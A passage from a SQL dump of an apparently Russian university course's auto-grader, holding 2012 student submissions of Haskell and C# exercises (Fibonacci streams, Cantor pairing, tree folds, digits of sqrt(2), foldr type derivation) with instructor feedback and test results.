(2687, 79, '442421', '2012-10-25 09:00:03', 2, '   --- Нет, это не совсем то.. Вы могли бы сами заметить, что у вас \r\n   --- получается непериодическая последовательностью Например\r\n   --- если ввести 3, то ответ дб конечно 3333333 - а у вас довольно скоро\r\n   --- начинают печататься совсем другие цифры.\r\n   --- Исправьте, пожалуйста (подсказка - тут вообще не надо использовать\r\n   --- double. Потому что double - это _приближенное_ представление числа,\r\n   --- оно не может дать бесконечное число правильных знаков.   \r\nclass Program\r\n    {\r\n        static IEnumerable<int> digits(int _n)\r\n        {\r\n            double n = Math.Abs((double)_n);\r\n            double p = 1.0 / n;\r\n            int r;\r\n            while (p>0)\r\n            {\r\n                p *= 10.0;\r\n                r = (int)p;\r\n                p -= r;\r\n                yield return r;\r\n            }\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            Console.WriteLine("input int:");\r\n            string s;\r\n            s = Console.ReadLine();\r\n\r\n            int n = int.Parse(s.Trim());\r\n\r\n            Console.WriteLine();\r\n\r\n            IEnumerator<int> en = digits(n).GetEnumerator();\r\n            for (int i = 0; i < 100 && en.MoveNext(); ++i)\r\n            {\r\n                Console.Write(en.Current + " ");\r\n            }\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.ReadKey();\r\n        }\r\n    }', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(2688, 80, '442421', '2012-10-25 09:20:50', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\nusing System.Threading.Tasks;\r\n\r\n\r\n\r\nnamespace _19._2\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static IEnumerable<KeyValuePair<int, int>> Cantor()\r\n\r\n        {\r\n\r\n            int a = 1;\r\n\r\n            int b = 1;\r\n\r\n\r\n\r\n            int _a;\r\n\r\n            int _b;\r\n\r\n            for (; ; )\r\n\r\n            {\r\n\r\n                _a = a;\r\n\r\n                _b = b;\r\n\r\n                if (_b == 1)\r\n\r\n                {\r\n\r\n                    b = a+1;\r\n\r\n                    a = 1;\r\n\r\n                }\r\n\r\n                else\r\n\r\n                {\r\n\r\n                    ++a;\r\n\r\n                    --b; \r\n\r\n                }\r\n\r\n                yield return new KeyValuePair<int, int>(_a, _b);\r\n\r\n            }\r\n\r\n        }\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            string s = Console.ReadLine();\r\n\r\n            int n = int.Parse(s.Trim());\r\n\r\n\r\n\r\n            IEnumerator<KeyValuePair<int, int>> en = Cantor().GetEnumerator();\r\n\r\n            for (int i = 0; i < n; ++i)\r\n\r\n            {\r\n\r\n                en.MoveNext();\r\n\r\n                Console.Write(en.Current + " ");\r\n\r\n            }\r\n\r\n\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2689, 73, '442421', '2012-10-25 10:13:42', 1, '--так мне кажется будет быстрее\r\nfi = (1 + sqrt 5) / 2\r\nfibs = map (\r\n-> round (( (fi^n) - (1/(-fi)^n) ) / (2*fi -1)) ) [1,2..]\r\n   --- Так может будет и быстрее (но не думаю, что существенно, кстати..)\r\n   --- но при больших n будет давать неправильные ответы - потому что\r\n   --- phi - это _приближенное_ представление. Те если нам надо получить\r\n   --- неограниченную точность то double по своей сути никак не подходят..\r\n   ---  Просто если интересно, быстрее всего вычислять, видимо, так, как \r\n   --- написано тут: http://algolist.manual.ru/maths/count_fast/fibonacci.php\r\n\r\n--по-моему, так с завязыванием\r\nfibs'' = 1 : 1 : [a + b | (a, b) <- zip fibs'' (tail fibs'')]', '<br/>Тесты успешно пройдены!'),
(2690, 79, '442421', '2012-10-25 12:03:39', 1, ' --- Ок, но на самом деле, мне кажется у вас слишком сложно - тут можно написать\r\n --- очень простой цикл\r\n﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\nusing System.Threading.Tasks;\r\n\r\n\r\n\r\nnamespace _19._1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static IEnumerable<int> digits(int _n)\r\n\r\n        {\r\n\r\n            int n = Math.Abs(_n);\r\n\r\n            int p = 10;\r\n\r\n            int res;\r\n\r\n            while (p>0)\r\n\r\n            {\r\n\r\n                if (p < n)\r\n\r\n                {\r\n\r\n                    p *= 10;\r\n\r\n                    yield return 0;\r\n\r\n                }\r\n\r\n                else\r\n\r\n                {\r\n\r\n                    res = p/n;\r\n\r\n                    p = (p%n)*10;\r\n\r\n\r\n\r\n                    if (res == 0)\r\n\r\n                    {\r\n\r\n                        yield return 0;\r\n\r\n                    }\r\n\r\n                    else\r\n\r\n                    {\r\n\r\n                        int a = res;\r\n\r\n                        int b = 0;\r\n\r\n                        int i = 0;\r\n\r\n                        int r;\r\n\r\n                        while (a > 0)\r\n\r\n                        {\r\n\r\n                            b += (int)Math.Pow(10, i++) * (a % 10);\r\n\r\n                            a /= 10;\r\n\r\n                        }\r\n\r\n                        while (b > 0)\r\n\r\n                        {\r\n\r\n                            r = b % 10;\r\n\r\n                            b /= 10;\r\n\r\n                            yield return r;\r\n\r\n                        }\r\n\r\n                    }\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            Console.WriteLine("input int:");\r\n\r\n            string s;\r\n\r\n            s = Console.ReadLine();\r\n\r\n\r\n\r\n            int n = int.Parse(s.Trim());\r\n\r\n\r\n\r\n            Console.WriteLine();\r\n\r\n\r\n\r\n            IEnumerator<int> en = digits(n).GetEnumerator();\r\n\r\n            for (int i = 0; i < 100 && en.MoveNext(); ++i)\r\n\r\n            {\r\n\r\n                Console.Write(en.Current + " ");\r\n\r\n            }\r\n\r\n\r\n\r\n            Console.WriteLine();\r\n\r\n\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2691, 74, 'erwert', '2012-10-25 13:05:33', 1, '  --- ОК, зачтено, но на самом деле правильнее\r\n  ---  x l r -> (ifok x) + ifok l + ifok r\r\n  --- Ведь l и r - это по смыслу _суммы_ (подсчитаные соева и справа). Зачем же их еще проверять на отрицательность?\r\ndata Tree = Empty | Node Double Tree Tree deriving(Show,Eq)\r\n\r\nfoldTree f t Empty = t\r\nfoldTree f t (Node x l r) =  f x lres rres\r\n	where\r\n		lres = foldTree f t l\r\n		rres = foldTree f t r\r\n\r\nifok a = (a + (abs a))/2\r\nsumPos t = foldTree (x l r -> (ifok x) + (ifok l) + (ifok r)) 0 t', '<br/>Тесты успешно пройдены!'),
(2692, 74, '3431532', '2012-10-25 14:16:55', 0, '\r\ndata Node = Empty\r\n            | Node Int Node Node\r\n\r\ntype TreeAlgebra a r = (r, Int -> r -> r -> r)\r\n\r\nfoldTree :: TreeAlgebra a r -> Node -> r\r\nfoldTree (f, g) Empty        = f\r\nfoldTree (f, g) (Node x l r) = g x (foldTree (f, g) l) (foldTree (f, g) r)\r\n\r\n\r\nsumPos = (0, x l r -> if (x>0) then x + r + l  else l + r )', 'Не удалось вычислить выражение "sumPos (Node 3 (Node (-1) Empty Empty) (Node 4 Empty Empty))", проверьте правильность синтаксиса'),
(2693, 74, '3431532', '2012-10-25 14:18:32', 1, 'data Node = Empty\r\n            | Node Int Node Node\r\n\r\ntype TreeAlgebra a r = (r, Int -> r -> r -> r)\r\n\r\nfoldTree :: TreeAlgebra a r -> Node -> r\r\nfoldTree (f, g) Empty        = f\r\nfoldTree (f, g) (Node x l r) = g x (foldTree (f, g) l) (foldTree (f, g) r)\r\n\r\n\r\nsumPos  = foldTree (0, x l r -> if (x>0) then x + r + l  else l + r )', '<br/>Тесты успешно пройдены!'),
(2694, 69, '4837959', '2012-10-25 16:21:30', 1, 'bigSin x = head $ take 1 $ filter (>= x) [sin i | i <- [1..]]', '<br/>Тесты успешно пройдены!'),
(2695, 70, '4837959', '2012-10-25 16:26:01', 1, 'myFilter f l = foldr (x res -> if f x\r\n                                then x:res\r\n                                else res) [] l\r\n', '<br/>Тесты успешно пройдены!'),
(2696, 71, '4837959', '2012-10-25 16:42:49', 1, 'approxSum (x:xs) = if abs x >= 0.000001\r\n                   then x + approxSum xs\r\n                   else 0\r\nz = approxSum [1/(i * i) | i <- [1..]]', '<br/>Тесты успешно пройдены!'),
(2697, 72, '4837959', '2012-10-25 16:49:47', 1, 'weekends = 0:0:0:0:0:1:1:weekends\r\nweekendExpences xs = sum.zipWith (*) weekends $ xs\r\n', '<br/>Тесты успешно пройдены!'),
(2698, 76, '12206137', '2012-10-25 16:55:58', 1, 'class Shape a where\r\n\r\n    perimeter :: a -> Double\r\n\r\n\r\n\r\ndata Circle = Circle Double\r\n\r\ndata Rect = Rect Double Double\r\n\r\n\r\n\r\ninstance Shape Circle where\r\n\r\n    perimeter (Circle r) = 2 * pi * r\r\n\r\n\r\n\r\ninstance Shape Rect where\r\n\r\n    perimeter (Rect a b) = 2 * (a + b)\r\n\r\n    \r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2699, 73, '4837959', '2012-10-25 17:06:00', 1, 'fibs = 1:1:(zipWith (+) fibs $ tail fibs)', '<br/>Тесты успешно пройдены!'),
(2700, 74, '4837959', '2012-10-25 17:36:31', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nfoldTree f e Empty = e\r\nfoldTree f e (Node x l r) = let\r\n                                lres = foldTree f e l\r\n                                rres = foldTree f e r\r\n                            in f x lres rres\r\n\r\nsumPos t = foldTree (x l r -> l + r + if x > 0\r\n                                       then x\r\n                                       else 0) 0 t\r\n', '<br/>Тесты успешно пройдены!'),
(2701, 76, '4837959', '2012-10-25 17:45:53', 1, 'data Circle = Circle Double\r\ndata Rect = Rect Double Double\r\n\r\nclass Shape a where\r\n    perimeter::a -> Double\r\n\r\ninstance Shape Circle where\r\n    perimeter (Circle r) = 2 * pi * r\r\n\r\ninstance Shape Rect where\r\n    perimeter (Rect x y) = 2 * (x + y)\r\n', '<br/>Тесты успешно пройдены!'),
(2702, 73, '419046', '2012-10-25 17:47:03', 1, 'fibs = 1:1:(zipWith (+) (tail fibs) fibs )\r\n', '<br/>Тесты успешно пройдены!'),
(2703, 74, '419046', '2012-10-25 17:47:23', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nfoldTree f e Empty = e\r\n\r\nfoldTree f e (Node x l r) = let\r\n\r\n                              lres = foldTree f e l\r\n\r\n                              rres = foldTree f e r\r\n\r\n                            in f x lres rres\r\n\r\nsumPos t = foldTree ( x l r -> if (x > 0) then (x + l + r) else (l + r)) 0 t\r\n', '<br/>Тесты успешно пройдены!'),
(2704, 76, '419046', '2012-10-25 17:57:56', 1, 'data Circle = Circle Double\r\n\r\ndata Rect = Rect Double Double\r\n\r\nclass Shape a where\r\n\r\n  perimeter::a -> Double\r\n\r\ninstance Shape Rect where\r\n\r\n  perimeter (Rect x y) = (2*x + 2*y)\r\n\r\ninstance Shape Circle where\r\n\r\n  perimeter (Circle r) = (2*3.14*r)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2705, 72, '419046', '2012-10-25 18:05:58', 1, 'weekends = 0:0:0:0:0:1:1:weekends\r\n\r\nweekendExpences xs = sum (zipWith (*) (weekends) (xs))\r\n', '<br/>Тесты успешно пройдены!'),
(2706, 71, '419046', '2012-10-25 19:01:49', 0, 'approxSum (x:xs) = if (x >= 0.000001) then (x + approxSum xs)\r\n\r\n                   else 0\r\n\r\nz = map ( i -> 1 / (i * i)) [1..]\r\n --- У вас опечатка, вы не совсем то считаете, посмотрите на z внимательнее\r\n', 'Не удалось вычислить выражение "z>1.64 && z<1.65", проверьте правильность синтаксиса'),
(2707, 71, '419046', '2012-10-25 19:09:52', 0, 'approxSum (x:xs) = if (x >= 0.000001) then (x + approxSum xs)\r\n\n                   else 0\r\n\nz = approxSum (map ( i -> 1 / (i * i)) [1..])\n', 'Хитрый тест номер 1 не пройден :(<br/>Подсказка: Последовательность может содержать и отрицательные числа'),
(2708, 71, '419046', '2012-10-25 19:10:57', 1, 'approxSum (x:xs) = if (abs x >= 0.000001) then (x + approxSum xs)\r\n\r\n                   else 0\r\n\r\nz = approxSum (map ( i -> 1 / (i * i)) [1..])\r\n', '<br/>Тесты успешно пройдены!'),
(2709, 65, '419046', '2012-10-25 19:36:50', 1, 'cantor1 n = map ( x -> (x, n - x)) [1..n-1] ++ cantor1 (n + 1)\r\n\r\ncantor = cantor1 2\r\n', '<br/>Тесты успешно пройдены!'),
(2710, 78, '44060', '2012-10-25 19:42:51', 1, 'pascal = iterate (\r\now -> zipWith (+) ([0] ++ row) (row ++ [0])) [1]', '<br/>Тесты успешно пройдены!'),
(2711, 78, '442421', '2012-10-25 19:53:42', 1, 'pascal = [1] : zipWith (x y->zipWith(+) x y) (map ([0]++) pascal) (map (++[0]) pascal)', '<br/>Тесты успешно пройдены!'),
(2712, 65, '1705225', '2012-10-25 20:05:48', 1, 'cantor = [(x,y)| i<-[1..], x<-[1..i], y<-[1..i], i == (x+y-1)*(x+y-2)+y]\r\n\r\n-- руководствовался алгоритмом отсюда http://citforum.ru/programming/theory/serebryakov/2.shtml\r\n    --- ОК, засчитано, но это, на самом деле, очень, очень неэфффективно (не алгоритм, а то как вы его\r\n    --- реализовали. Например, когда i дойдет до 1000, то выполнится фактически\r\n    --- x<-[1..1000], y<-[1..1000], 1000 == (x+y-1)*(x+y-2)+y\r\n    --- Те мы будем перебирать все возможные пары (10000000 вариантов!) чтобы найти нужную', '<br/>Тесты успешно пройдены!'),
(2713, 74, '550896', '2012-10-25 20:35:54', 0, 'sumPos :: Tree Int -> Int\r\nsumPos t =  \r\n  foldTree'' (x y z -> if x > 0 then x + y + z else y + z) 0 t\r\n\r\nfoldTree'' :: (Int -> Int -> Int -> Int) -> Int -> Tree Int -> Int\r\nfoldTree'' op x Empty = x\r\nfoldTree'' op x (Node a left right) = \r\n  op a (foldTree'' op x left) (foldTree'' op x right)', 'Не удалось вычислить выражение "sumPos (Node 3 (Node (-1) Empty Empty) (Node 4 Empty Empty))", проверьте правильность синтаксиса'),
(2714, 74, '550896', '2012-10-25 20:36:53', 1, 'data Tree a = Empty | Node a (Tree a) (Tree a)\r\n\r\nsumPos :: Tree Int -> Int\r\nsumPos t =  \r\n  foldTree'' (x y z -> if x > 0 then x + y + z else y + z) 0 t\r\n\r\nfoldTree'' :: (Int -> Int -> Int -> Int) -> Int -> Tree Int -> Int\r\nfoldTree'' op x Empty = x\r\nfoldTree'' op x (Node a left right) = \r\n  op a (foldTree'' op x left) (foldTree'' op x right)', '<br/>Тесты успешно пройдены!'),
(2715, 66, '442421', '2012-10-25 21:01:51', 1, 'cantor = cantor'' (1,1)\r\n\r\ncantor'' (a,b) = if b==1 then [(a,b)]++cantor'' (1,a+1)\r\n		else [(a,b)]++cantor'' (a+1,b-1)\r\n\r\ngeneralizedCantor 1 = map (i->[i]) [1,2..]\r\n\r\ngeneralizedCantor n = map ((a,b)-> (fromInteger a):generalizedCantor'' (n-1) (fromInteger b)) cantor\r\n\r\ngeneralizedCantor'' n i = last (take i (generalizedCantor n))\r\n', '<br/>Тесты успешно пройдены!'),
(2716, 77, '44060', '2012-10-25 21:35:02', 1, 'import Data.Bits\r\n\r\nsqr a = a * a\r\n\r\nsqrt2 =\r\n    inner 2 0\r\n    where\r\n        inner val rezult =\r\n            let\r\n                binarySearch l r =\r\n                    if r <= l + 1 then l\r\n                    else\r\n                        let m = (l + r) `div` 2 in\r\n                        if sqr (rezult + m) <= val then binarySearch m r\r\n                        else binarySearch l m\r\n                next = binarySearch 0 10\r\n            in\r\n            next: inner (val * 100) ((rezult + next) * 10)', '<br/>Тесты успешно пройдены!'),
(2717, 69, '442421', '2012-10-25 21:39:34', 1, 'bigSin x = if abs x>=1 then error "sin (int rad) < 1"\r\n	   else head (snd (break (x<=) (map (sin) [1,2..])))', '<br/>Тесты успешно пройдены!'),
(2718, 77, '51559263', '2012-10-25 23:49:40', 0, 'longSqrt2 0 = 0\r\n\nlongSqrt2 n = let \r\n\n                  previous = longSqrt2 (n-1)\r\n\n\r\n\n              in 10 * previous + maximum [ d | d <- [0..9], (10 * previous + d)^2 <= 2 * 10^(2*(n-1)) ]\r\n\n\r\n\n\r\n\n\r\n\nsqrt2 = [ mod (longSqrt2 n) 10 | n <- [1..] ]\r\n\n\n', '<br/>Тесты успешно пройдены!'),
(2719, 77, '51559263', '2012-10-26 00:00:11', 1, 'longSqrt2 0 = 0\r\n\r\nlongSqrt2 n = let \r\n\r\n                 previous = longSqrt2 (n-1)\r\n\r\n                 newDigit = maximum [ d | d <- [0..9], (10 * previous + d)^2 <= 2 * 10^(2*(n-1)) ]\r\n\r\n              in 10 * previous + newDigit\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nsqrt2 = [ mod (longSqrt2 n) 10 | n <- [1..] ]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2720, 74, '374969', '2012-10-26 11:22:04', 1, '--http://traditio-ru.org/wiki/%D0%9A%D0%B0%D1%82%D0%B0%D0%BC%D0%BE%D1%80%D1%84%D0%B8%D0%B7%D0%BC\r\ndata Tree a = Empty | Node a (Tree a) (Tree a)\r\n\r\ntype TreeAlgebra a r = (r, a -> r -> r -> r)\r\n\r\nfoldTree :: TreeAlgebra a r -> Tree a -> r\r\nfoldTree (f, g) Empty        = f\r\nfoldTree (f, g) (Node x l r) = g x (foldTree (f, g) l) (foldTree (f, g) r)\r\n\r\nsumPos = foldTree (0, x l r -> max (l+r) (x+l+r))\r\n   --- Ну или короче -> max (x, 0) + l + r', '<br/>Тесты успешно пройдены!'),
(2721, 77, 'hasp', '2012-10-26 16:42:46', 0, 'import Data.List\r\n--извлекаем корень столбиком...\r\ngrowBT k n = if k > n then k else growBT (k*10) n\r\ndigits = 1:4:(snd (mapAccumL ((acc, curDig) e -> \r\n			let d = acc `div` curDig; nd = (curDig*10 + d)*d; newAcc = (growBT acc nd) - nd in ((if d == 0 then newAcc*100 else newAcc*10, curDig*10 + 2*d), d) ) (40, 28) (2 : repeat 0)))', 'Не удалось вычислить выражение "take 20 sqrt2", проверьте правильность синтаксиса'),
(2722, 77, 'hasp', '2012-10-26 16:43:19', 1, 'import Data.List\r\n--извлекаем корень столбиком...\r\ngrowBT k n = if k > n then k else growBT (k*10) n\r\nsqrt2 = 1:4:(snd (mapAccumL ((acc, curDig) e -> \r\n			let d = acc `div` curDig; nd = (curDig*10 + d)*d; newAcc = (growBT acc nd) - nd in ((if d == 0 then newAcc*100 else newAcc*10, curDig*10 + 2*d), d) ) (40, 28) (2 : repeat 0)))', '<br/>Тесты успешно пройдены!'),
(2723, 76, 'hasp', '2012-10-26 17:33:11', 1, 'class Shape a where \r\n	area :: a -> Double\r\n	perimeter :: a -> Double\r\n	\r\ndata Circle = Circle Double\r\ndata Rect = Rect Double Double\r\n\r\ninstance Shape Rect where \r\n	area (Rect x y) = x*y\r\n	perimeter (Rect x y) = 2*x + 2*y\r\ninstance Shape Circle where \r\n	area (Circle r) = 3.1415 * r*r	\r\n	perimeter (Circle r) = 3.1415 * 2 * r', '<br/>Тесты успешно пройдены!'),
(2724, 76, '550896', '2012-10-26 17:42:17', 1, 'data Rect = Rect Double Double\r\ndata Circle = Circle Double\r\n\r\nclass Shape a where\r\n    perimeter :: a -> Double\r\n\r\ninstance Shape Rect where\r\n    perimeter (Rect x y) = 2 * x + 2 * y\r\n    \r\ninstance Shape Circle where\r\n    perimeter (Circle r) = 2 * pi * r', '<br/>Тесты успешно пройдены!'),
(2725, 74, 'hasp', '2012-10-26 17:54:45', 1, 'data Tree a = Node a (Tree a) (Tree a) | Empty\r\n\r\nfoldTree f e Empty = e\r\nfoldTree f e (Node x l r) = let lres = foldTree f e l; rres = foldTree f e r in f x lres rres \r\nsumPos t = foldTree (x l r -> (if x > 0 then x  else 0) + l + r) 0 t', '<br/>Тесты успешно пройдены!'),
(2726, 75, '550896', '2012-10-26 18:08:58', 2, 'foldr: (a -> b -> b) -> b -> [a] -> b\r\nfoldr f z []     = z \r\nfoldr f z (x:xs) = f x (foldr f z xs) \r\n\r\nСначала построим предположений:\r\nfoldr: a -> b -> c -> d\r\nf: e -> m -> g\r\nz: h\r\nx: k\r\nxs: [k]\r\n\r\nПостроим систему равенств:\r\na = e -> m -> g\r\nb = h\r\nb = d\r\nc = [k]\r\ne = k\r\nm = d\r\ng = d\r\n\r\nИ решим систему: \r\na -> b -> c -> d = \r\n(e -> m -> g) -> b -> [k] -> b = \r\n(e -> d -> d) -> b -> [e] -> b\r\n(e -> b -> b) -> b -> [e] -> b\r\n   --- А принципе правильно, конечно, но давайте я вас попрошу привести обоснования. Почеиу мы знает, что например\r\n   --- b = h. Это следует из текста, но как именно? Приведите пожалуйста обоснования ко всем равенствам,\r\n   --- можно неформально, как мы это делали на занятии.', '<br/>Тесты успешно пройдены!'),
(2727, 75, 'hasp', '2012-10-26 18:29:56', 2, '--foldr f z []     = z (*)\r\n--foldr f z (x:xs) = f x (foldr f z xs) (**)\r\n\r\n--a1->a2->a3->a4\r\n--(*): a1->a2->[a5]->a4\r\n--(**), рассм (x:xs): используется констр списков, a3 - список => a1->a2->[a6]->a4\r\n--(**), рассм f x (...): x::a6, (...)::a4, f::?-> a4 => (a6->a4->a4)->a2->[a6]->a4\r\n--(*), foldr ... = z, значит z::a4, a2=a4 => a1->a4->a3->a4\r\n\r\n--(a6->a4->a4) -> a2 -> [a6] -> a4\r\n--a1           -> a4 ->  a3  -> a4 \r\n-----------\r\n--a1=(a6->a4->a4) ; a2=a4 ; [a6]=a3 ; a4=a4\r\n   --- Так а почему a2 == a4 и [a6] == a3? Приведите какие-нибудь обоснования, пожалуйста.\r\n--(a6->a4->a4)->a4->[a6]->a4 === (a->b->b)->b->[a]->b\r\n', '<br/>Тесты успешно пройдены!'),
(2728, 69, '4169333', '2012-10-26 19:43:09', 1, 'bigSin x=  ([ sin y| y<-[1..],sin y  >= x]) !! 0', '<br/>Тесты успешно пройдены!'),
(2729, 70, '4169333', '2012-10-26 19:44:04', 1, 'myFilter cond xs = foldr ( x xs-> if (cond x) then x:xs else xs) [] xs\r\n', '<br/>Тесты успешно пройдены!'),
(2730, 71, '4169333', '2012-10-26 19:44:39', 0, 'approxSum (x:xs) = appSum1 (x:xs) 0\r\nappSum1 (x:xs) res = if (x>0.000001) \r\n                     then (appSum1 xs res+x)\r\n	             else res\r\nz= approxSum [ 1/(x*x) | x<-[1..]]', 'Хитрый тест номер 1 не пройден :(<br/>Подсказка: Последовательность может содержать и отрицательные числа'),
(2731, 71, '4169333', '2012-10-26 19:47:21', 1, 'approxSum (x:xs) = appSum1 (x:xs) 0\r\nappSum1 (x:xs) res = if (x>0.000001 || x<(-0.000001)) \r\n                     then (appSum1 xs res+x)\r\n	             else res\r\nz= approxSum [ 1/(x*x) | x<-[1..]]', '<br/>Тесты успешно пройдены!'),
(2732, 72, '4169333', '2012-10-26 19:48:21', 1, 'weekendExpences (x:xs)=w1 (x:xs) 1 0\r\nw1 [] count sum=sum\r\nw1 (x:xs) count sum = if ((mod (count+1) 7==0) || (mod count 7==0))\r\n		      then w1 xs (count+1) (sum+x)\r\n                      else w1 xs (count+1) sum\r\n', '<br/>Тесты успешно пройдены!'),
(2733, 73, '4169333', '2012-10-26 19:48:58', 1, 'fibss= 0: fibs\r\nfibs= 1: (zipWith (+) fibs fibss) \r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2734, 74, '4169333', '2012-10-26 19:49:25', 1, 'data Tree= Empty | Node Integer Tree Tree\r\nfoldTree f e Empty = e\r\nfoldTree f e (Node x l r)= let\r\n			     lres=foldTree f e l\r\n		             rres=foldTree f e r\r\n                           in f x lres rres\r\nsumPos t =foldTree (x l r -> \r\n			if (x>0) then (x+l+r) \r\n			else  (l+r) ) 0 t\r\n', '<br/>Тесты успешно пройдены!'),
(2735, 76, '4169333', '2012-10-26 19:49:46', 1, 'data Circle = Circle Double\r\ndata Rect = Rect Double Double\r\nclass Shape a where\r\n	perimeter::a -> Double\r\ninstance Shape Rect where\r\n	perimeter (Rect x y)=2*(x+y)\r\ninstance Shape Circle where\r\n	perimeter (Circle r)= 2*3.141592653589793*r', '<br/>Тесты успешно пройдены!'),
(2736, 66, '472848', '2012-10-26 20:09:58', 1, 'cantorS 2 s = [[i, s - i]| i <- [1..s - 1]]\r\ncantorS n s = [i:xc| i <- [1..s - n + 1], xc <- cantorS (n-1) (s-i)] \r\ngeneralizedCantor n = [xs| s <- [n..], xs <- cantorS n s]', '<br/>Тесты успешно пройдены!'),
(2737, 65, '397095', '2012-10-27 09:16:00', 1, 'cantor = [(n - i + 1, i) | n <- [1..], i <- [1..n]]', '<br/>Тесты успешно пройдены!'),
(2738, 77, '5772638', '2012-10-27 10:46:06', 2, 'sqrt2 = 1: [x|b<-[1..],x<-[mod (truncate((2*(100^b)) **(1/2))) 10 ]]\r\n   --- Идея не такая плохая, но проблема в том, что когда вы извлекаете квадратный корень\r\n   --- то вы начинаете работать с вещественными числами. А там число знаков ограничено.\r\n   --- Те вы никак не сможете получить, скажем 20 правильных цифр.\r\n   --- Что же делать? В принципе, достаточно написать свою функцию, которая правильно извлекает\r\n   --- квадратный корень из очень больших целых чисел. И использовать ее вместо **(1/2).\r\n', 'Выражение имеет неправильное значение: take 20 sqrt2'),
(2739, 75, '397095', '2012-10-27 11:04:27', 0, 'foldr f z []     = z\r\nfoldr f z (x:xs) = f x (foldr f z xs)\r\n\r\n(1) foldr :: a1 -> a2 -> a3 -> a4\r\n(2) \r\n- (x:xs) имеет тип a3 => a3 = [a5]\r\n- f имеет тип a1, применяется к a2 и a5, возвращает a4 => a1 = a2 -> a5 -> a4\r\nполучается:\r\nfoldr :: (a5 -> a2 -> a4) -> a2 -> [a5] -> a4\r\n(3)\r\n- z имеет тип a2 и в от же время возвращается в первом случае, => a2 = a4\r\n\r\nитого ответ:\r\nfoldr :: (a -> b -> b) -> b -> [a] -> b\r\n', '<br/>Тесты успешно пройдены!'),
(2740, 69, '5772638', '2012-10-27 11:40:06', 1, 'bigSin x =head( filter(>=x) (map sin [1..]))', '<br/>Тесты успешно пройдены!'),
(2741, 70, '5772638', '2012-10-27 11:48:09', 1, 'myFilter f []=[]\r\nmyFilter f (x:xs)= if f x == True then (x: myFilter f xs) else myFilter f xs\r\n  --- Вместо f x == True можно просто f x', '<br/>Тесты успешно пройдены!'),
(2742, 75, '397095', '2012-10-27 11:53:27', 1, 'Поправленное решение:\r\n\r\nfoldr f z []     = z\r\nfoldr f z (x:xs) = f x (foldr f z xs)\r\n\r\n(1) foldr :: a1 -> a2 -> a3 -> a4\r\n(2) \r\n- (x:xs) имеет тип a3 => a3 = [a5]\r\n- f имеет тип a1, применяется к a5 и a4, возвращает a4 => a1 = a5 -> a4 -> a4\r\nполучается:\r\nfoldr :: (a5 -> a4 -> a4) -> a2 -> [a5] -> a4\r\n(3)\r\n- z имеет тип a2 и в от же время возвращается в первом случае, => a2 = a4\r\n\r\nитого ответ:\r\nfoldr :: (a -> b -> b) -> b -> [a] -> b', '<br/>Тесты успешно пройдены!'),
(2743, 71, '5772638', '2012-10-27 12:04:00', 1, 'approxSum (x:xs)=if ((abs x) > 0.000001) then x+approxSum xs else 0\r\nz=approxSum [1/(i)^2| i<-[1..]]', '<br/>Тесты успешно пройдены!'),
(2744, 72, '5772638', '2012-10-27 12:21:09', 1, 'week = 0:0:0:0:0:1:1:week\r\nweekendExpences =sum.(zipWith (*) week)', '<br/>Тесты успешно пройдены!'),
(2745, 75, 'hasp', '2012-10-27 14:07:25', 1, '--foldr f z []     = z (*)\r\n--foldr f z (x:xs) = f x (foldr f z xs) (**)\r\n\r\n--a1->a2->a3->a4\r\n--(*): "[]" => a1->a2->[a5]->a4\r\n--(**), рассм (x:xs): используется ":", a3 - список => a1->a2->[a6]->a4 <1>\r\n--(**), рассм f x (...): x::a6, (...)::a4, f::?-> a4 => (a6->a4->a4)->a2->[a6]->a4\r\n--(*), foldr ... = z, значит z::a4, a2=a4 => a1->a4->a3->a4 <2>\r\n\r\n--для ** (a6->a4->a4) -> a2 -> [a6] -> a4  (т.е. a1=(a6->a4->a$), a2=a2 и т.д.)\r\n--        ||             ||     ||     ||\r\n--для *   a1          -> a4 ->  a3  -> a4  (т.е. a1=a1, a2=a4, и т.д.)\r\n--- приравняем у них правые части, получим\r\n--a1=(a6->a4->a4) ; a2=a4 ; [a6]=a3 ; a4=a4\r\n   --- Так а почему a2 == a4 и [a6] == a3? Приведите какие-нибудь обоснования, пожалуйста.\r\n--(a6->a4->a4)->a4->[a6]->a4 === (a->b->b)->b->[a]->b', '<br/>Тесты успешно пройдены!'),
